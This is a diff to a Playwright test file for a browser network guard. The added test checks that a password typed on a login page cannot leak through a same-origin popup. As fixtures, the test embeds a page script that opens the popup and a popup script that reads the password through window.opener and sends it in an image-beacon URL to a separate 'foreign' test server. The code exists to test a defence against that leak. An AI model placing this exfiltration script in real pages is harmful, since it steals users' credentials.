@@ -6,6 +6,7 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { Readable } from 'node:stream'
 import { expect, test } from '@playwright/test'
+import { installNetworkGuard } from '../../src/guard/index.js'
 import { startBrowserService } from '../../src/service/start.js'
 import { loginVaultPath, openLoginVault } from '../../src/vault/index.js'
 import { refOf, type BrowserResult } from './helpers.js'
@@ -91,6 +92,62 @@ test('пароль на странице не уходит на чужой са�
     await expect.poll(() => stolen).toEqual(['/after-login.gif'])
   } finally {
     await service.close()
+    site.close()
+    foreign.close()
+  }
+})
+
+test('окно того же сайта не уносит пароль: замок — на весь контекст, пока заперта хоть одна страница', async ({ browser }) => {
+  const stolen: string[] = []
+  const foreign = createServer((request, response) => {
+    stolen.push(request.url ?? '')
+    response.writeHead(200, { 'content-type': 'image/gif' })
+    response.end()
+  })
+  const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')
+
+  // Новое окно того же сайта читает пароль через opener и уносит его уже от себя.
+  const leakScript = `
+    document.querySelector('input[type=password]')?.addEventListener('input', () => window.open('/popup', 'reader'))
+  `
+  const popupScript = `
+    const value = window.opener?.document.querySelector('input[type=password]')?.value
+    if (value) new Image().src = '${foreignUrl}/opener?p=' + encodeURIComponent(value)
+  `
+  const site = createServer((request, response) => {
+    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
+    if (request.url === '/popup') response.end(`<!doctype html><title>Окно</title><script>${popupScript}</script>`)
+    else if (request.url === '/cabinet') response.end(`<!doctype html><title>Кабинет</title><img src="${foreignUrl}/after-login.gif">`)
+    else response.end(`<!doctype html><title>Вход</title><input type="password" name="password"><script>${leakScript}</script>`)
+  })
+  const siteUrl = await listen(site)
+
+  // Сам замок, без сервиса: сервис ещё и закрывает новые окна, но не мгновенно — окно успевает сделать запрос.
+  const context = await browser.newContext()
+  const blocked: string[] = []
+  const guard = await installNetworkGuard(context, { allowedOrigins: [siteUrl], allowedMutations: [] }, (request) => blocked.push(request.code))
+  try {
+    const page = await context.newPage()
+    await page.goto(`${siteUrl}/login`)
+    guard.passwordFilled(page)
+    await page.fill('input[type=password]', PASSWORD)
+    await expect.poll(() => context.pages().some((opened) => opened.url().endsWith('/popup'))).toBe(true)
+    const reader = context.pages().find((opened) => opened.url().endsWith('/popup'))!
+    await reader.waitForLoadState('load')
+    await expect.poll(() => blocked.filter((code) => code === 'refused_leak').length).toBeGreaterThanOrEqual(1)
+
+    // Страница с паролем ушла на новый документ, окно живо — замок держится: картинка кабинета и поздний запрос окна закрыты.
+    await page.goto(`${siteUrl}/cabinet`)
+    await reader.evaluate((url) => void (new Image().src = `${url}/late`), foreignUrl)
+    await expect.poll(() => blocked.length).toBeGreaterThanOrEqual(3)
+    expect(stolen).toEqual([])
+
+    // Окна закрыты — на новом документе замок снят.
+    for (const other of context.pages()) if (other !== page) await other.close()
+    await page.goto(`${siteUrl}/cabinet`)
+    await expect.poll(() => stolen).toEqual(['/after-login.gif'])
+  } finally {
+    await context.close()
     site.close()
     foreign.close()
   }
